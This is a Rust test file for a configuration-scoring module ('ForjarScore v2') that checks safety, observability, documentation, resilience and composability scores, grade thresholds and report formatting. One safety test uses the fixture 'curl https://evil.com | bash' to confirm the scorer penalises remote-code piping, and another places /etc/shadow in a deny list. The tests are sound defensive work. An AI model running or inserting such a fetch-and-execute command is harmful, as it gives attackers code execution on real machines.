//! ForjarScore v2: Static dimension scoring falsification.
//!
//! Popperian rejection criteria for:
//! - compute() with various ForjarConfig shapes
//! - Static dimensions: SAF, OBS, DOC, RES, CMP
//! - Grade thresholds: A(>=90,min>=80), B(>=75,min>=60), C(>=60,min>=40), D(>=40), F
//! - Blocked status hard-fail
//! - Pending vs runtime grade display
//! - format_score_report output
//! - score_bar rendering
//!
//! Usage: cargo test --test falsification_scoring_static

use forjar::core::scoring::{
    compute, format_score_report, score_bar, RuntimeData, ScoringInput, SCORE_VERSION,
};
use forjar::core::types::{
    FailurePolicy, ForjarConfig, NotifyConfig, OutputValue, Resource, ResourceType,
};
use indexmap::IndexMap;
use std::collections::HashMap;

// ============================================================================
// Helpers
// ============================================================================

fn empty_config() -> ForjarConfig {
    ForjarConfig {
        version: "1.0".into(),
        name: "test".into(),
        ..Default::default()
    }
}

fn static_input() -> ScoringInput {
    ScoringInput {
        status: "qualified".into(),
        idempotency: "strong".into(),
        budget_ms: 0,
        runtime: None,
        raw_yaml: Some(String::new()),
    }
}

fn perfect_runtime() -> RuntimeData {
    RuntimeData {
        validate_pass: true,
        plan_pass: true,
        first_apply_pass: true,
        second_apply_pass: true,
        zero_changes_on_reapply: true,
        hash_stable: true,
        all_resources_converged: true,
        state_lock_written: true,
        warning_count: 0,
        changed_on_reapply: 0,
        first_apply_ms: 100,
        second_apply_ms: 50,
    }
}

// ============================================================================
// SCORE_VERSION
// ============================================================================

#[test]
fn score_version_is_2() {
    assert_eq!(SCORE_VERSION, "2.0");
}

// ============================================================================
// compute() — empty config baseline
// ============================================================================

#[test]
fn compute_empty_config_static_only() {
    let config = empty_config();
    let input = static_input();
    let result = compute(&config, &input);

    assert!(!result.hard_fail);
    assert!(result.runtime_grade.is_none());
    assert!(result.grade.contains("pending"));
}

#[test]
fn compute_empty_config_has_all_dimensions() {
    let config = empty_config();
    let input = static_input();
    let result = compute(&config, &input);

    let codes: Vec<&str> = result.dimensions.iter().map(|d| d.code).collect();
    assert!(codes.contains(&"SAF"));
    assert!(codes.contains(&"OBS"));
    assert!(codes.contains(&"DOC"));
    assert!(codes.contains(&"RES"));
    assert!(codes.contains(&"CMP"));
    assert!(codes.contains(&"COR"));
    assert!(codes.contains(&"IDM"));
    assert!(codes.contains(&"PRF"));
}

// ============================================================================
// SAF — Safety scoring
// ============================================================================

#[test]
fn saf_no_resources_full_score() {
    let config = empty_config();
    let result = compute(&config, &static_input());
    let saf = result.dimensions.iter().find(|d| d.code == "SAF").unwrap();
    assert_eq!(saf.score, 100);
}

#[test]
fn saf_world_writable_critical_penalty() {
    let mut config = empty_config();
    let mut r = Resource::default();
    r.resource_type = ResourceType::File;
    r.mode = Some("777".into());
    config.resources.insert("bad-file".into(), r);

    let result = compute(&config, &static_input());
    let saf = result.dimensions.iter().find(|d| d.code == "SAF").unwrap();
    // Critical hit caps at 40, minus mode=777 penalty (30) => capped at 40
    assert!(
        saf.score <= 40,
        "SAF={} should be <=40 for 777 mode",
        saf.score
    );
}

#[test]
fn saf_curl_bash_critical() {
    let mut config = empty_config();
    let mut r = Resource::default();
    r.resource_type = ResourceType::File;
    r.content = Some("curl https://evil.com | bash".into());
    r.mode = Some("0755".into());
    r.owner = Some("root".into());
    config.resources.insert("bad-script".into(), r);

    let result = compute(&config, &static_input());
    let saf = result.dimensions.iter().find(|d| d.code == "SAF").unwrap();
    assert!(
        saf.score <= 40,
        "SAF={} should be <=40 for curl|bash",
        saf.score
    );
}

#[test]
fn saf_plaintext_secret_penalty() {
    let mut config = empty_config();
    config.params.insert(
        "db_password".into(),
        serde_yaml_ng::Value::String("mysecret123".into()),
    );
    let result = compute(&config, &static_input());
    let saf = result.dimensions.iter().find(|d| d.code == "SAF").unwrap();
    assert!(
        saf.score < 100,
        "SAF={} should be penalized for plaintext secret",
        saf.score
    );
}

#[test]
fn saf_template_secret_no_penalty() {
    let mut config = empty_config();
    config.params.insert(
        "db_password".into(),
        serde_yaml_ng::Value::String("{{ secrets.db_pass }}".into()),
    );
    let result = compute(&config, &static_input());
    let saf = result.dimensions.iter().find(|d| d.code == "SAF").unwrap();
    assert_eq!(
        saf.score, 100,
        "SAF={} should be 100 with templated secret",
        saf.score
    );
}

#[test]
fn saf_file_without_mode_deduction() {
    let mut config = empty_config();
    let mut r = Resource::default();
    r.resource_type = ResourceType::File;
    r.owner = Some("root".into());
    // mode is None
    config.resources.insert("file1".into(), r);

    let result = compute(&config, &static_input());
    let saf = result.dimensions.iter().find(|d| d.code == "SAF").unwrap();
    assert!(
        saf.score < 100,
        "SAF={} should have deduction for missing mode",
        saf.score
    );
}

// ============================================================================
// OBS — Observability scoring
// ============================================================================

#[test]
fn obs_default_config_tripwire_lock() {
    // Default Policy has tripwire=true, lock_file=true => OBS starts at 30
    let config = empty_config();
    let result = compute(&config, &static_input());
    let obs = result.dimensions.iter().find(|d| d.code == "OBS").unwrap();
    assert!(
        obs.score >= 30,
        "OBS={} should be >=30 with default tripwire+lock",
        obs.score
    );
}

#[test]
fn obs_no_tripwire_no_lock() {
    let mut config = empty_config();
    config.policy.tripwire = false;
    config.policy.lock_file = false;
    let result = compute(&config, &static_input());
    let obs = result.dimensions.iter().find(|d| d.code == "OBS").unwrap();
    assert_eq!(
        obs.score, 0,
        "OBS={} should be 0 with no observability features",
        obs.score
    );
}

#[test]
fn obs_notify_hooks_score() {
    let mut config = empty_config();
    config.policy.notify = NotifyConfig {
        on_success: Some("curl http://slack".into()),
        on_failure: Some("curl http://pager".into()),
        on_drift: Some("curl http://alert".into()),
    };

    let result = compute(&config, &static_input());
    let obs = result.dimensions.iter().find(|d| d.code == "OBS").unwrap();
    assert!(
        obs.score >= 20,
        "OBS={} should be >=20 with all notify hooks",
        obs.score
    );
}

#[test]
fn obs_output_descriptions_bonus() {
    let mut config = empty_config();
    config.outputs.insert(
        "url".into(),
        OutputValue {
            value: "{{ resources.web.url }}".into(),
            description: Some("Web endpoint URL".into()),
        },
    );
    config.policy.tripwire = true;

    let result = compute(&config, &static_input());
    let obs = result.dimensions.iter().find(|d| d.code == "OBS").unwrap();
    // outputs + output descriptions + tripwire
    assert!(obs.score >= 25, "OBS={} should be >=25", obs.score);
}

// ============================================================================
// DOC — Documentation scoring
// ============================================================================

#[test]
fn doc_empty_yaml_zero() {
    let config = empty_config();
    let result = compute(&config, &static_input());
    let doc = result.dimensions.iter().find(|d| d.code == "DOC").unwrap();
    assert_eq!(doc.score, 0);
}

#[test]
fn doc_description_bonus() {
    let mut config = empty_config();
    config.description = Some("A well-documented recipe".into());

    let result = compute(&config, &static_input());
    let doc = result.dimensions.iter().find(|d| d.code == "DOC").unwrap();
    assert!(
        doc.score >= 15,
        "DOC={} should be >=15 with description",
        doc.score
    );
}

#[test]
fn doc_header_metadata_scoring() {
    let mut config = empty_config();
    config.name = "web-stack".into();
    let yaml = "# Recipe: web-stack\n# Tier: production\n# Idempotency: strong\n# Budget: 30s\nversion: 1.0\n";
    let input = ScoringInput {
        status: "qualified".into(),
        idempotency: "strong".into(),
        budget_ms: 30000,
        runtime: None,
        raw_yaml: Some(yaml.into()),
    };

    let result = compute(&config, &input);
    let doc = result.dimensions.iter().find(|d| d.code == "DOC").unwrap();
    // Recipe + Tier + Idempotency + Budget = 32, kebab-case name + 3
    assert!(
        doc.score >= 32,
        "DOC={} should be >=32 with header metadata",
        doc.score
    );
}

#[test]
fn doc_unique_comments_bonus() {
    let mut config = empty_config();
    let yaml = "# Comment A\n# Comment B\n# Comment C\nversion: 1.0\n";
    let input = ScoringInput {
        status: "qualified".into(),
        idempotency: "strong".into(),
        budget_ms: 0,
        runtime: None,
        raw_yaml: Some(yaml.into()),
    };

    let result = compute(&config, &input);
    let doc = result.dimensions.iter().find(|d| d.code == "DOC").unwrap();
    assert!(
        doc.score >= 15,
        "DOC={} should be >=15 with 3+ unique comments",
        doc.score
    );
}

// ============================================================================
// RES — Resilience scoring
// ============================================================================

#[test]
fn res_empty_config_zero() {
    let config = empty_config();
    let result = compute(&config, &static_input());
    let res = result.dimensions.iter().find(|d| d.code == "RES").unwrap();
    assert_eq!(res.score, 0);
}

#[test]
fn res_failure_policy_score() {
    let mut config = empty_config();
    config.policy.failure = FailurePolicy::ContinueIndependent;
    config.policy.ssh_retries = 3;

    let result = compute(&config, &static_input());
    let res = result.dimensions.iter().find(|d| d.code == "RES").unwrap();
    assert!(
        res.score >= 25,
        "RES={} should be >=25 with failure+retries",
        res.score
    );
}

#[test]
fn res_deny_paths_bonus() {
    let mut config = empty_config();
    config.policy.deny_paths = vec!["/etc/shadow".into()];

    let result = compute(&config, &static_input());
    let res = result.dimensions.iter().find(|d| d.code == "RES").unwrap();
    assert!(
        res.score >= 10,
        "RES={} should be >=10 with deny_paths",
        res.score
    );
}

#[test]
fn res_hooks_score() {
    let mut config = empty_config();
    config.policy.pre_apply = Some("echo pre".into());
    config.policy.post_apply = Some("echo post".into());

    let result = compute(&config, &static_input());
    let res = result.dimensions.iter().find(|d| d.code == "RES").unwrap();
    assert!(
        res.score >= 16,
        "RES={} should be >=16 with pre+post hooks",
        res.score
    );
}

// ============================================================================
// CMP — Composability scoring
// ============================================================================

#[test]
fn cmp_empty_config_zero() {
    let config = empty_config();
    let result = compute(&config, &static_input());
    let cmp = result.dimensions.iter().find(|d| d.code == "CMP").unwrap();
    assert_eq!(cmp.score, 0);
}

#[test]
fn cmp_params_score() {
    let mut config = empty_config();
    config
        .params
        .insert("port".into(), serde_yaml_ng::Value::from(8080));

    let result = compute(&config, &static_input());
    let cmp = result.dimensions.iter().find(|d| d.code == "CMP").unwrap();
    assert!(
        cmp.score >= 15,
        "CMP={} should be >=15 with params",
        cmp.score
    );
}

#[test]
fn cmp_templates_score() {
    let mut config = empty_config();
    let mut r = Resource::default();
    r.resource_type = ResourceType::File;
    r.content = Some("port={{params.port}}".into());
    config.resources.insert("cfg".into(), r);

    let result = compute(&config, &static_input());
    let cmp = result.dimensions.iter().find(|d| d.code == "CMP").unwrap();
    assert!(
        cmp.score >= 10,
        "CMP={} should be >=10 with templates",
        cmp.score
    );
}

#[test]
fn cmp_tags_score() {
    let mut config = empty_config();
    let mut r = Resource::default();
    r.resource_type = ResourceType::Package;
    r.tags = vec!["web".into()];
    config.resources.insert("nginx".into(), r);

    let result = compute(&config, &static_input());
    let cmp = result.dimensions.iter().find(|d| d.code == "CMP").unwrap();
    assert!(
        cmp.score >= 15,
        "CMP={} should be >=15 with tags",
        cmp.score
    );
}

#[test]
fn cmp_includes_score() {
    let mut config = empty_config();
    config.includes = vec!["common.yaml".into()];

    let result = compute(&config, &static_input());
    let cmp = result.dimensions.iter().find(|d| d.code == "CMP").unwrap();
    assert!(
        cmp.score >= 10,
        "CMP={} should be >=10 with includes",
        cmp.score
    );
}

#[test]
fn cmp_secrets_template_score() {
    let mut config = empty_config();
    let mut r = Resource::default();
    r.resource_type = ResourceType::File;
    r.content = Some("password={{ secrets.db_pass }}".into());
    config.resources.insert("secret-file".into(), r);

    let result = compute(&config, &static_input());
    let cmp = result.dimensions.iter().find(|d| d.code == "CMP").unwrap();
    // templates + secrets = 10 + 5
    assert!(
        cmp.score >= 5,
        "CMP={} should be >=5 with secrets template",
        cmp.score
    );
}

// ============================================================================
// Grade thresholds
// ============================================================================

#[test]
fn blocked_status_hard_fail() {
    let config = empty_config();
    let input = ScoringInput {
        status: "blocked".into(),
        idempotency: "strong".into(),
        budget_ms: 0,
        runtime: None,
        raw_yaml: Some(String::new()),
    };
    let result = compute(&config, &input);
    assert!(result.hard_fail);
    assert!(result.hard_fail_reason.is_some());
    assert!(result.grade.contains("blocked"));
}

#[test]
fn pending_status_no_hard_fail() {
    let config = empty_config();
    let input = ScoringInput {
        status: "pending".into(),
        idempotency: "strong".into(),
        budget_ms: 0,
        runtime: None,
        raw_yaml: Some(String::new()),
    };
    let result = compute(&config, &input);
    assert!(!result.hard_fail);
    assert!(result.grade.contains("pending"));
}

// ============================================================================
// Runtime grade display
// ============================================================================

#[test]
fn runtime_grade_displayed_when_present() {
    let config = empty_config();
    let input = ScoringInput {
        status: "qualified".into(),
        idempotency: "strong".into(),
        budget_ms: 0,
        runtime: Some(perfect_runtime()),
        raw_yaml: Some(String::new()),
    };
    let result = compute(&config, &input);
    assert!(result.runtime_grade.is_some());
    assert!(result.grade.contains('/'));
    // Grade should be like "F/A" (empty config has low static but perfect runtime)
}

#[test]
fn runtime_composite_present() {
    let config = empty_config();
    let input = ScoringInput {
        status: "qualified".into(),
        idempotency: "strong".into(),
        budget_ms: 5000, // Need budget > 0 for PRF scoring
        runtime: Some(perfect_runtime()),
        raw_yaml: Some(String::new()),
    };
    let result = compute(&config, &input);
    assert!(result.runtime_composite.is_some());
    let rc = result.runtime_composite.unwrap();
    assert!(
        rc >= 80,
        "runtime composite={rc} should be >=80 with perfect runtime and budget"
    );
}

// ============================================================================
// Static weights
// ============================================================================

#[test]
fn static_dimension_weights() {
    let config = empty_config();
    let result = compute(&config, &static_input());

    let saf = result.dimensions.iter().find(|d| d.code == "SAF").unwrap();
    let obs = result.dimensions.iter().find(|d| d.code == "OBS").unwrap();
    let doc = result.dimensions.iter().find(|d| d.code == "DOC").unwrap();
    let res = result.dimensions.iter().find(|d| d.code == "RES").unwrap();
    let cmp = result.dimensions.iter().find(|d| d.code == "CMP").unwrap();

    assert!((saf.weight - 0.25).abs() < f64::EPSILON);
    assert!((obs.weight - 0.20).abs() < f64::EPSILON);
    assert!((doc.weight - 0.15).abs() < f64::EPSILON);
    assert!((res.weight - 0.20).abs() < f64::EPSILON);
    assert!((cmp.weight - 0.20).abs() < f64::EPSILON);
}

// ============================================================================
// format_score_report
// ============================================================================

#[test]
fn format_score_report_has_version() {
    let config = empty_config();
    let result = compute(&config, &static_input());
    let report = format_score_report(&result);
    assert!(report.contains("Forjar Score v2"));
}

#[test]
fn format_score_report_has_static_grade() {
    let config = empty_config();
    let result = compute(&config, &static_input());
    let report = format_score_report(&result);
    assert!(report.contains("Static Grade:"));
}

#[test]
fn format_score_report_has_runtime_pending() {
    let config = empty_config();
    let result = compute(&config, &static_input());
    let report = format_score_report(&result);
    assert!(report.contains("Runtime Grade: pending"));
}

#[test]
fn format_score_report_has_runtime_grade() {
    let config = empty_config();
    let input = ScoringInput {
        status: "qualified".into(),
        idempotency: "strong".into(),
        budget_ms: 0,
        runtime: Some(perfect_runtime()),
        raw_yaml: Some(String::new()),
    };
    let result = compute(&config, &input);
    let report = format_score_report(&result);
    assert!(report.contains("Runtime Grade:"));
    assert!(!report.contains("pending"));
}

#[test]
fn format_score_report_has_dimension_codes() {
    let config = empty_config();
    let result = compute(&config, &static_input());
    let report = format_score_report(&result);
    assert!(report.contains("SAF"));
    assert!(report.contains("OBS"));
    assert!(report.contains("DOC"));
    assert!(report.contains("RES"));
    assert!(report.contains("CMP"));
}

#[test]
fn format_score_report_hard_fail() {
    let config = empty_config();
    let input = ScoringInput {
        status: "blocked".into(),
        idempotency: "strong".into(),
        budget_ms: 0,
        runtime: None,
        raw_yaml: Some(String::new()),
    };
    let result = compute(&config, &input);
    let report = format_score_report(&result);
    assert!(report.contains("HARD FAIL"));
}

// ============================================================================
// score_bar
// ============================================================================

#[test]
fn score_bar_zero() {
    let bar = score_bar(0);
    assert_eq!(bar, "[....................]");
}

#[test]
fn score_bar_hundred() {
    let bar = score_bar(100);
    assert_eq!(bar, "[####################]");
}

#[test]
fn score_bar_fifty() {
    let bar = score_bar(50);
    assert_eq!(bar, "[##########..........]");
}

#[test]
fn score_bar_length_constant() {
    for s in [0, 10, 25, 50, 75, 90, 100] {
        let bar = score_bar(s);
        assert_eq!(bar.len(), 22, "bar length for score={s} should be 22");
    }
}

// ============================================================================
// DimensionScore names
// ============================================================================

#[test]
fn dimension_names_correct() {
    let config = empty_config();
    let result = compute(&config, &static_input());

    let name_map: HashMap<&str, &str> =
        result.dimensions.iter().map(|d| (d.code, d.name)).collect();
    assert_eq!(name_map["SAF"], "Safety");
    assert_eq!(name_map["OBS"], "Observability");
    assert_eq!(name_map["DOC"], "Documentation");
    assert_eq!(name_map["RES"], "Resilience");
    assert_eq!(name_map["CMP"], "Composability");
    assert_eq!(name_map["COR"], "Correctness");
    assert_eq!(name_map["IDM"], "Idempotency");
    assert_eq!(name_map["PRF"], "Performance");
}
